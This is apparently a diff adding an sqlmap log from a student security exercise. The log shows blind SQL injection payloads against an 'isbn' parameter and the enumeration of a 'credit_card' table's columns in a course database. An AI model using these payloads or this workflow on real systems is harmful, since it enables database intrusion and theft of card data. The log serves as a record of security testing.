@@ -1,0 +1,74 @@
+
+    sqlmap/1.0-dev - automatic SQL injection and database takeover tool
+    http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting at 23:04:47
+
+[23:04:47] [INFO] resuming back-end DBMS 'mysql' 
+[23:04:47] [INFO] testing connection to the target URL
+[23:04:47] [INFO] heuristics detected web page charset 'ISO-8859-2'
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: isbn
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: isbn=9788274775268' AND 4646=4646 AND 'TEwU'='TEwU
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: isbn=9788274775268' AND SLEEP(5) AND 'LTxt'='LTxt
+---
+[23:04:47] [INFO] the back-end DBMS is MySQL
+web application technology: JSP, JSP 2.2
+back-end DBMS: MySQL 5
+[23:04:47] [INFO] fetching columns for table 'credit_card' in database 'sigbjoo_group12'
+[23:04:47] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
+[23:04:47] [INFO] retrieved: 
+[23:04:47] [INFO] heuristics detected web page charset 'ascii'
+
+[23:04:47] [INFO] retrieved: [23:04:47] [WARNING] time-based comparison needs larger statistical model. Making a few dummy requests, please wait..
+do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
+[23:04:53] [WARNING] it is very important not to stress the network adapter's bandwidth during usage of time-based payloads
+5
+[23:04:58] [INFO] retrieved: 
+[23:05:00] [INFO] retrieved: 
+[23:05:05] [INFO] adjusting time delay to 1 second due to good response times
+id
+[23:05:12] [INFO] retrieved: 
+[23:05:14] [INFO] retrieved: int(10) unsigned
+[23:06:21] [INFO] retrieved: 
+[23:06:23] [INFO] retrieved: customer_id
+[23:07:10] [INFO] retrieved: 
+[23:07:12] [INFO] retrieved: int(10) unsigned
+[23:08:20] [INFO] retrieved: 
+[23:08:22] [INFO] retrieved: cc_number
+[23:08:59] [INFO] retrieved: 
+[23:09:00] [INFO] retrieved: char(16)
+[23:09:29] [INFO] retrieved: 
+[23:09:31] [INFO] retrieved: expiry_date
+[23:10:19] [INFO] retrieved: 
+[23:10:21] [INFO] retrieved: date
+[23:10:36] [INFO] retrieved: 
+[23:10:38] [INFO] retrieved: cardholder_name
+[23:11:40] [INFO] retrieved: 
+[23:11:42] [INFO] retrieved: varchar(255)
+Database: sigbjoo_group12
+Table: credit_card
+[5 columns]
++-----------------+------------------+
+| Column          | Type             |
++-----------------+------------------+
+| cardholder_name | varchar(255)     |
+| cc_number       | char(16)         |
+| customer_id     | int(10) unsigned |
+| expiry_date     | date             |
+| id              | int(10) unsigned |
++-----------------+------------------+
+
+[23:12:26] [INFO] fetched data logged to text files under '/home/others/shomeb/a/andesil/sqlmapproject-sqlmap-f11e15a/output/paris.idi.ntnu.no'
+
+[*] shutting down at 23:12:26
+
